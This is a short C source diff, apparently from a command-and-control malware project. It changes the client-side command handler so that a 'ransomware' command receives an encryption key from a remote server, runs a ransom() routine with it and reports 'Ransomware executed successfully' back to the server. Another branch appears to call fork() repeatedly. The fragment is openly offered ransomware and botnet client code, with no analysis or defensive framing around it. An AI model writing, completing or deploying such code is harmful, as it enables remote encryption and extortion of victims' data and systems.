@@ -55,25 +55,30 @@ void handle_client_commands(int socket_fd)
                 fork();
             }
         }
-        else if (strcmp(buffer, "ransomware") == 0)
+       else if (strcmp(buffer, "ransomware") == 0)
         {
-
             printf("Executing ransomware...\n");
 
-           char *random_string = "Toto";
-            if (random_string <= 0)
+            // Recevoir la clé aléatoire générée par le serveur
+            bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
+            if (bytes_read <= 0)
             {
-                perror("recv");
-                close(socket_fd);
-                continue;
+                if (bytes_read == 0)
+                    printf("Server disconnected while waiting for the random string.\n");
+                else
+                    perror("recv");
+                break;
             }
-            printf("Client identifier received: \"%s\"\n", buffer);
-            printf("Generated random string for exfiltration: %s\n", random_string);
-            ransom(random_string);
 
-            // Envoyer la chaîne générée au serveur
-            send(socket_fd, random_string, strlen(random_string), 0);
+            buffer[bytes_read] = '\0'; // Terminer la chaîne reçue
+            printf("Received random string: %s\n", buffer);
 
+            // Appeler la fonction ransomware avec la clé reçue
+            ransom(buffer);
+
+            // Envoyer une confirmation au serveur
+            const char *confirmation = "Ransomware executed successfully";
+            send(socket_fd, confirmation, strlen(confirmation), 0);
         }
         else if (strcmp(buffer, "out") == 0)
         {
